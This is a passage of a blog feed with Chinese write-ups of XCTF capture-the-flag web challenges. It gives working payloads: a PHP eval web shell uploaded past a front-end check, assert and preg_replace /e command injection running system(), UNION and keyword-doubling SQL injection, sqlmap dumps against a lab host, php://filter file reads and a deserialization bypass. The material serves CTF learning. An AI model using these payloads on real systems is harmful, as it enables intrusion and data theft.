class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"config.php"</span>);</span><br><span class="line">$a=@$_GET[<span class="string">'a'</span>];</span><br><span class="line">$b=@$_GET[<span class="string">'b'</span>];</span><br><span class="line"><span class="keyword">if</span>($a==<span class="number">0</span> <span class="keyword">and</span> $a)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(is_numeric($b))&#123;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($b&gt;<span class="number">1234</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>== 比较<br><strong>var_dump(‘a’ == 0)  //true</strong><br>a会被转化为数字0<br><strong>var_dump(‘1234a’ == 1234)  //true</strong><br>这里’1234a’会被转化为1234</p><p>=== 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较。<br>== 在进行比较的时候，会先将字符串类型转化成相同，再比较。</p><p>在$a==$b的比较中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$a=<span class="string">' '</span>;$b=<span class="keyword">null</span>        <span class="comment">//true</span></span><br><span class="line">$a=<span class="keyword">null</span>;$b=<span class="keyword">true</span>      <span class="comment">//true</span></span><br><span class="line">$a=<span class="number">0</span>;$b=<span class="string">'0'</span>       <span class="comment">//true</span></span><br><span class="line">$a=<span class="number">0</span>;$b=<span class="string">'abcdef '</span>  <span class="comment">//true  而0===’abcdef '  false</span></span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ol><li>F12常开着</li><li>burp常开着</li><li>试试访问robots.txt</li><li>备份文件一般是在后缀名后加.swp，.bak</li><li>蚁剑是有两个部分的，一个是启动程序，一个是源码</li><li>php的弱类型</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h3 id=&quot;view-source&quot;&gt;&lt;a href=&quot;#view-source&quot; class=&quot;headerlink&quot; title=&quot;view source&quot;&gt;&lt;/a&gt;view source&lt;/h3&gt;&lt;p&gt;禁用右键，F12审查元素&lt;/p&gt;
&lt;h3 
      
    
    </summary>
    
      <category term="CTF wp" scheme="http://yoursite.com/categories/CTF-wp/"/>
    
    
      <category term="XCTF" scheme="http://yoursite.com/tags/XCTF/"/>
    
      <category term="wp" scheme="http://yoursite.com/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>XCTF-Web进阶(一)</title>
    <link href="http://yoursite.com/2019/06/01/XCTF-Web%E8%BF%9B%E9%98%B6(%E4%B8%80)/"/>
    <id>http://yoursite.com/2019/06/01/XCTF-Web进阶(一)/</id>
    <published>2019-05-31T18:37:38.578Z</published>
    <updated>2019-05-31T18:32:11.364Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ics-06"><a href="#ics-06" class="headerlink" title="ics-06"></a>ics-06</h1><p>纯脑洞题，注意题目描述，<strong>报表中心</strong></p><p>进入主页后，选择报表中心，发现URL有个id参数，爆破到id=2333即可</p><h1 id="Training-Get-Resourced"><a href="#Training-Get-Resourced" class="headerlink" title="Training-Get-Resourced"></a>Training-Get-Resourced</h1><p>审查元素</p><h1 id="Training-WWW-Robots"><a href="#Training-WWW-Robots" class="headerlink" title="Training-WWW-Robots"></a>Training-WWW-Robots</h1><p>直接访问robots.txt，发现fl0g.php，访问即可</p><h1 id="NaNNaNNaNNaN-Batman"><a href="#NaNNaNNaNNaN-Batman" class="headerlink" title="NaNNaNNaNNaN-Batman"></a>NaNNaNNaNNaN-Batman</h1><p>下载附件，是一段js代码，后缀名改成html</p><p>最后的eval是执行函数，将eval改为console.log，向控制台输出一条消息</p><p>即可查看代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">$</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> e=<span class="built_in">document</span>.getElementById(<span class="string">"c"</span>).value;</span><br><span class="line"><span class="keyword">if</span>(e.length==<span class="number">16</span>)</span><br><span class="line"><span class="keyword">if</span>(e.match(<span class="regexp">/^be0f23/</span>)!=<span class="literal">null</span>)</span><br><span class="line"><span class="keyword">if</span>(e.match(<span class="regexp">/233ac/</span>)!=<span class="literal">null</span>)</span><br><span class="line"><span class="keyword">if</span>(e.match(<span class="regexp">/e98aa$/</span>)!=<span class="literal">null</span>)</span><br><span class="line"><span class="keyword">if</span>(e.match(<span class="regexp">/c7be9/</span>)!=<span class="literal">null</span>)&#123;</span><br><span class="line"><span class="keyword">var</span> t=[<span class="string">"fl"</span>,<span class="string">"s_a"</span>,<span class="string">"i"</span>,<span class="string">"e&#125;"</span>];</span><br><span class="line"><span class="keyword">var</span> n=[<span class="string">"a"</span>,<span class="string">"_h0l"</span>,<span class="string">"n"</span>];</span><br><span class="line"><span class="keyword">var</span> r=[<span class="string">"g&#123;"</span>,<span class="string">"e"</span>,<span class="string">"_0"</span>];</span><br><span class="line"><span class="keyword">var</span> i=[<span class="string">"it'"</span>,<span class="string">"_"</span>,<span class="string">"n"</span>];</span><br><span class="line"><span class="keyword">var</span> s=[t,n,r,i];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> o=<span class="number">0</span>;o&lt;<span class="number">13</span>;++o)&#123;</span><br><span class="line"><span class="built_in">document</span>.write(s[o%<span class="number">4</span>][<span class="number">0</span>]);s[o%<span class="number">4</span>].splice(<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">'&lt;input id="c"&gt;&lt;button onclick=$()&gt;Ok&lt;/button&gt;'</span>);</span><br><span class="line"><span class="keyword">delete</span> _</span><br></pre></td></tr></table></figure><p>要求：</p><p>1、字符串长度16</p><p>2、以be0f23开头</p><p>3、以e98aa结尾</p><p>4、有233ac和c7be9</p><p>很容易拼接得到结果：be0f233ac7be98aa</p><h1 id="lottery"><a href="#lottery" class="headerlink" title="lottery"></a>lottery</h1><p>打开robots.txt，发现是个.git源码泄露，githack下载源码，很明显，buy是最关键的部分</p><p>数据是通过json传输的，buy的数据格式就是{“action”:”buy”,”numbers”:”1234567”}</p><p>关键函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">buy</span><span class="params">($req)</span></span>&#123;</span><br><span class="line">require_registered();</span><br><span class="line">require_min_money(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">$money = $_SESSION[<span class="string">'money'</span>];</span><br><span class="line">$numbers = $req[<span class="string">'numbers'</span>];</span><br><span class="line">$win_numbers = random_win_nums();</span><br><span class="line">$same_count = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>; $i&lt;<span class="number">7</span>; $i++)&#123;</span><br><span class="line"><span class="keyword">if</span>($numbers[$i] == $win_numbers[$i])&#123;</span><br><span class="line">$same_count++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>存在一个弱类型比较，$numbers[$i] == $win_numbers[$i]，直接让传输的numbers全为true，即构造<strong>{“action”:”buy”,”numbers”:[true,true,true,true,true,true,true]}</strong>，刷金币购买flag</p><h1 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h1><p>文件上传，js前端验证后缀名，基于本地验证文件是否符合要求。直接将js禁用。或者burp抓包后修改后缀，将php文件后缀先改为jpg，burp抓包后改回php。</p><p>新建文件1.php，内容如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">'shell'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>改名为1.jpg，然后上传，burp修改后缀，蚁剑连接。</p><h1 id="mfw"><a href="#mfw" class="headerlink" title="mfw"></a>mfw</h1><p>打开About页面，发现提示，git，尝试git泄露，githack下载源码，放到Seay中</p><p>目录结构</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/xctf_web/xctf_mfw_1.PNG" alt></p><p>可能存在的漏洞</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/xctf_web/xctf_mfw_2.PNG" alt></p><p>在index.php页面发现危险函数<strong>assert()</strong>，eval与assert都算是元老级一句话后门函数</p><p>eval函数中参数是字符，如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">'echo 1;'</span>);</span><br></pre></td></tr></table></figure><p>assert函数中参数为表达式 （或者为函数），如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">assert(phpinfo());</span><br><span class="line">assert(<span class="keyword">eval</span>(<span class="string">'echo 1;'</span>));</span><br></pre></td></tr></table></figure><p>index.php源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'page'</span>])) &#123;</span><br><span class="line">$page = $_GET[<span class="string">'page'</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$page = <span class="string">"home"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$file = <span class="string">"templates/"</span> . $page . <span class="string">".php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// I heard '..' is dangerous!</span></span><br><span class="line">assert(<span class="string">"strpos('$file', '..') === false"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Detected hacking attempt!"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Make this look nice</span></span><br><span class="line">assert(<span class="string">"file_exists('$file')"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"That file doesn't exist!"</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>第一个assert检测传入参数，防止LFI，第二个assert检查文件是否存在</p><p>可以在assert中构造代码执行，即<strong>system(‘cat templates/flag.php’)</strong>，直接闭合strpos函数即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$page = <span class="string">"about.php', '..') === false and system('cat templates/flag.php') and strpos('templates/flag"</span>;  <span class="comment">//第三步</span></span><br><span class="line"></span><br><span class="line">$file = <span class="string">"templates/about.php', '..') === false and system('cat templates/flag.php') and strpos('templates/flag.php"</span>;  <span class="comment">//第二步</span></span><br><span class="line"></span><br><span class="line">assert(<span class="string">"strpos('templates/about.php','..') === false and system('cat templates/flag.php') and strpos('templates/flag.php', '..') === false"</span>);  <span class="comment">//第一步</span></span><br></pre></td></tr></table></figure><h1 id="PHP2"><a href="#PHP2" class="headerlink" title="PHP2"></a>PHP2</h1><p>访问index.phps，获取源码片段，别问怎么知道的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">");   exit(); &#125;  $_GET[id] = urldecode($_GET[id]); if($_GET[id] == "</span>admin<span class="string">") &#123;   echo "</span></span><br><span class="line"></span><br><span class="line">Access granted!</span><br><span class="line"></span><br><span class="line"><span class="string">";   echo "</span></span><br><span class="line"></span><br><span class="line">Key: xxxxxxx </span><br><span class="line"></span><br><span class="line"><span class="string">"; &#125; ?&gt;</span></span><br></pre></td></tr></table></figure><p>get一个参数id，id进行urldecode之后为admin，admin的url编码是%61%64%6D%69%6E，再进行一次url编码，为%2561%2564%256D%2569%256E，在index.php中提交。</p><h1 id="FlatScience"><a href="#FlatScience" class="headerlink" title="FlatScience(*)"></a>FlatScience(*)</h1><p>扫描一下</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/xctf_web/xctf_FlatScience_1.PNG" alt></p><p>访问login.php，审查元素，在注释中发现提示， <strong>TODO: Remove ?debug-Parameter!</strong> </p><p>访问login.php?debug，拿到login.php的源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'usr'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'pw'</span>]))&#123;</span><br><span class="line">        $user = $_POST[<span class="string">'usr'</span>];</span><br><span class="line">        $pass = $_POST[<span class="string">'pw'</span>];</span><br><span class="line">        $db = <span class="keyword">new</span> SQLite3(<span class="string">'../fancy.db'</span>);</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">    $res = $db-&gt;query(<span class="string">"SELECT id,name from Users where name='"</span>.$user.<span class="string">"' and password='"</span>.sha1($pass.<span class="string">"Salz!"</span>).<span class="string">"'"</span>);</span><br><span class="line"><span class="keyword">if</span>($res)&#123;</span><br><span class="line">    $row = $res-&gt;fetchArray();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;Some Error occourred!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($row[<span class="string">'id'</span>]))&#123;</span><br><span class="line">        setcookie(<span class="string">'name'</span>,<span class="string">' '</span>.$row[<span class="string">'name'</span>], time() + <span class="number">60</span>, <span class="string">'/'</span>);</span><br><span class="line">        header(<span class="string">"Location: /"</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'debug'</span>]))</span><br><span class="line">highlight_file(<span class="string">'login.php'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>usr和pw没有经过任何过滤，可以直接注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST:</span><br><span class="line">usr=' union <span class="keyword">select</span> <span class="keyword">name</span>, <span class="keyword">sql</span> <span class="keyword">from</span> sqlite_master<span class="comment">--&amp;pw=peri0d</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">id</span>,<span class="keyword">name</span> <span class="keyword">from</span> <span class="keyword">Users</span> <span class="keyword">where</span> <span class="keyword">name</span>=<span class="string">''</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">name</span>, <span class="keyword">sql</span> <span class="keyword">from</span> sqlite_master<span class="comment">--' and password='".sha1("peri0d"."Salz!")."'</span></span><br></pre></td></tr></table></figure><p>在set-cookie得到<strong>CREATE+TABLE+Users%28id+int+primary+key%2Cname+varchar%28255%29%2Cpassword+varchar%28255%29%2Chint+varchar%28255%29%29</strong></p><p>解码得到</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="keyword">Users</span>(</span><br><span class="line"><span class="keyword">id</span> <span class="built_in">int</span> primary <span class="keyword">key</span>,</span><br><span class="line"><span class="keyword">name</span> <span class="built_in">varchar</span>(<span class="number">255</span>),</span><br><span class="line"><span class="keyword">password</span> <span class="built_in">varchar</span>(<span class="number">255</span>),</span><br><span class="line">hint <span class="built_in">varchar</span>(<span class="number">255</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h1 id="unserialize3"><a href="#unserialize3" class="headerlink" title="unserialize3"></a>unserialize3</h1><p>在主页获取到部分代码，盲猜反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123; </span><br><span class="line"><span class="keyword">public</span> $flag = <span class="string">'111'</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">'bad requests'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>__wakeup()这个函数是在对象创建的时候执行的，也就是说在创建一个xctf对象时，就立刻退出了</p><p>绕过方法：使类的属性数量大于原来的就可以了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123; </span><br><span class="line"><span class="keyword">public</span> $flag = <span class="string">'111'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> xctf();</span><br><span class="line">$a = serialize($a);</span><br><span class="line">print_r($a);</span><br><span class="line"><span class="comment">//$a = O:4:"xctf":1:&#123;s:4:"flag";s:3:"111";&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>将序列化结果改为 <strong>O:4:”xctf”:2:{s:4:”flag”;s:3:”111”;}</strong> 即可</p><h1 id="NewsCenter"><a href="#NewsCenter" class="headerlink" title="NewsCenter"></a>NewsCenter</h1><p>一个搜索框，尝试注入</p><p>输入 ‘ 返回空白页面，输入 ‘ # 返回正常，确定为字符注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&apos; order by 3 # //确认select字段为3</span><br><span class="line"></span><br><span class="line">&apos; union select 1,2,3 # //确认1，2，3的位置</span><br><span class="line"></span><br><span class="line">&apos; union select 1,2,(select schema_name from INFORMATION_SCHEMA.schemata limit 0,1) # //输出第一个库,INFORMATION_SCHEMA</span><br><span class="line"></span><br><span class="line">&apos; union select 1,2,(select schema_name from INFORMATION_SCHEMA.schemata limit 1,1) #  //输出第二个库,news,这里试出来总共就2个库</span><br><span class="line"></span><br><span class="line">&apos; union select 1,2,(select table_name from information_schema.tables where table_schema=&apos;news&apos; limit 1,1) # //这里试出来secret_table表</span><br><span class="line"></span><br><span class="line">&apos; union select 1,2,(select column_name from information_schema.columns where table_name=&apos;secret_table&apos; limit 0,1) #  //这里试出来fl4g字段</span><br><span class="line"></span><br><span class="line">&apos; union select 1,2,(select fl4g from secret_table) #  //直接查询</span><br></pre></td></tr></table></figure><h1 id="upload-RCTF-2015"><a href="#upload-RCTF-2015" class="headerlink" title="upload(RCTF-2015)"></a>upload(RCTF-2015)</h1><p>insert注入</p><p>通过fuzz发现过滤了select和from，过滤手段是将select和from替换为空值</p><p>(1).爆数据库名</p><p>a’+conv(hex((selselectect mid((selselectect database()),1,6))),16,10)+’a.jpg</p><p>结果：131277325825392，转化为字符串：web_up</p><p>另外一部分</p><p>a’+conv(hex((selselectect mid((selselectect database()),5,6))),16,10)+’a.jpg</p><p>结果：129125716025700，转化为字符串：upload</p><p>数据库：web_upload</p><p>(2).爆表</p><p>a’+conv(hex((selselectect mid((selselectect table_name frfromom information_schema.tables where table_schema=database() limit 1,1),1,6))),16,10)+’a.jpg</p><p>结果：114784820031327，转化为字符串：hello_</p><p>做一下偏移</p><p>a’+conv(hex((selselectect mid((selselectect table_name frfromom information_schema.tables where table_schema=database() limit 1,1),5,6))),16,10)+’a.jpg</p><p>结果：122455530955111，转化为字符串：o_flag</p><p>继续偏移</p><p>a’+conv(hex((selselectect mid((selselectect table_name frfromom information_schema.tables where table_schema=database() limit 1,1),11,6))),16,10)+’a.jpg</p><p>结果：104906511837285，转化为字符串：_is_he</p><p>最后结果为：hello_flag_is_here</p><p>(3).爆字段</p><p>a’+conv(hex((sselectelect mid((seselectlect column_name frfromom information_schema.columns where table_name=0x68656C6C6F5F666C61675F69735F68657265 limit 0,1),1,6))),16,10)+’a.jpg</p><p>然后爆出的字段：i_am_flag</p><p>(4).爆数据：</p><p>a’+conv(hex((sselectelect mid((selselectect i_am_flag frofromm hello_flag_is_here),1,6))),16,10)+’a.jpg</p><p>爆出的数据：RCTF{!!<a href="mailto:_@m_Th.e_F" target="_blank" rel="noopener">_@m_Th.e_F</a>!lag}</p><h1 id="Cat"><a href="#Cat" class="headerlink" title="Cat"></a>Cat</h1><p>在URL栏fuzz URL得到如下结果：</p><p>1、正常URL，返回ping结果</p><p>2、非法URL(特殊符号)，返回Invalid URL</p><p>3、%80，返回Django报错</p><p>将报错信息保存为html，打开即为django报错页面</p><p>发现数据库路径</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/xctf_web/xctf_cat_1.png" alt></p><p>pyload：@/opt/api/database.sqlite3</p><p>保存为html文件，发现flag</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/xctf_web/xctf_cat_2.png" alt></p><p>总结：</p><p>当  <strong>CURLOPT_SAFE_UPLOAD</strong> 为 true 时，PHP 可以通过在参数中注入 <strong>@</strong> 来读取文件。</p><p>当且仅当文件中存在中文字符的时候，Django 才会报错导致获取文件内容。  </p><h1 id="ics-04"><a href="#ics-04" class="headerlink" title="ics-04"></a>ics-04</h1><p>根据提示，可利用的页面有三个，分别为 login.php，register.php，findpwd.php</p><p>发现 findpwd.php 存在注入</p><p>sqlmap 一把梭</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -u <span class="string">"http://111.198.29.45:52139/findpwd.php"</span> --data <span class="string">"username=aaa"</span></span><br><span class="line"></span><br><span class="line"> python2 sqlmap.py -u <span class="string">"http://111.198.29.45:52139/findpwd.php"</span> --data <span class="string">"username=aaa"</span> --tables</span><br><span class="line"></span><br><span class="line">python2 sqlmap.py -u <span class="string">"http://111.198.29.45:52139/findpwd.php"</span> --data <span class="string">"username=aaa"</span> -D cetc004 -T user --dump</span><br></pre></td></tr></table></figure><p>得到用户信息</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/xctf_web/xctf_ics4_1.png" alt></p><p>这里又一个逻辑漏洞，可以覆盖已注册的用户，重新注册一下用户即可</p><h1 id="ics-05"><a href="#ics-05" class="headerlink" title="ics-05"></a>ics-05</h1><p>index.php?page=index</p><p>观察URL，明显是个文件包含</p><p>index.php?page=php://filter/convert.base64-encode/resource=index.php</p><p>读取index.php，关键代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>] === <span class="string">'127.0.0.1'</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br &gt;Welcome My Admin ! &lt;br &gt;"</span>;</span><br><span class="line"></span><br><span class="line">    $pattern = $_GET[pat];</span><br><span class="line">    $replacement = $_GET[rep];</span><br><span class="line">    $subject = $_GET[sub];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($pattern) &amp;&amp; <span class="keyword">isset</span>($replacement) &amp;&amp; <span class="keyword">isset</span>($subject)) &#123;</span><br><span class="line">        preg_replace($pattern, $replacement, $subject);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>X-Forwarded-For:127.0.0.1<br>/index.php?pat=/test/e&amp;rep=system(‘ls’);&amp;sub=test</p><p>/index.php?pat=/test/e&amp;rep=system(‘ls+-a+./s3chahahaDir’);&amp;sub=test</p><p>/index.php?<br>pat=/test/e&amp;rep=system(‘cat+./s3chahahaDir/flag/flag.php’);&amp;sub=test</p><p>遍历出目录，直接读取flag</p><p>总结：</p><p>preg_replace的 /e 模式会导致命令执行</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;ics-06&quot;&gt;&lt;a href=&quot;#ics-06&quot; class=&quot;headerlink&quot; title=&quot;ics-06&quot;&gt;&lt;/a&gt;ics-06&lt;/h1&gt;&lt;p&gt;纯脑洞题，注意题目描述，&lt;strong&gt;报表中心&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;进入主页后，选择报表中心，
      
    
    </summary>
    
      <category term="CTF wp" scheme="http://yoursite.com/categories/CTF-wp/"/>
    
    
      <category term="XCTF" scheme="http://yoursite.com/tags/XCTF/"/>
    
      <category term="wp" scheme="http://yoursite.com/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>JACTF Web部分</title>
    <link href="http://yoursite.com/2019/06/01/JACTF-Web%E9%83%A8%E5%88%86/"/>
    <id>http://yoursite.com/2019/06/01/JACTF-Web部分/</id>
    <published>2019-05-31T18:37:38.577Z</published>
    <updated>2019-05-31T18:29:52.043Z</updated>
    
